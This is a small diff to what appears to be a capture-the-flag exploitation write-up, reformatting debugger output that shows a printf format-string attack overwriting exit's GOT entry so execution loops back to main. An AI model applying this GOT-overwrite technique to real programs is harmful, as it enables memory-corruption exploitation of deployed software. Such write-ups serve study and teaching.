@@ -43,10 +43,9 @@ I did this by leaking a libc address and updating the GOT entry for exit() in on
   print r.sendline(payload)
 ```
 
-Before printf is called:
-`0x601258 (exit@got.plt) —▸ 0x400736 (exit@plt+6)`
-After printf is called:
-`0x601258 (exit@got.plt) —▸ 0x400b45 (main+114)`
+Before printf is called: `0x601258 (exit@got.plt) —▸ 0x400736 (exit@plt+6)`
+
+After printf is called:  `0x601258 (exit@got.plt) —▸ 0x400b45 (main+114)`
 
 So whenever exit() is called it will jump back into main+114 instead.
 
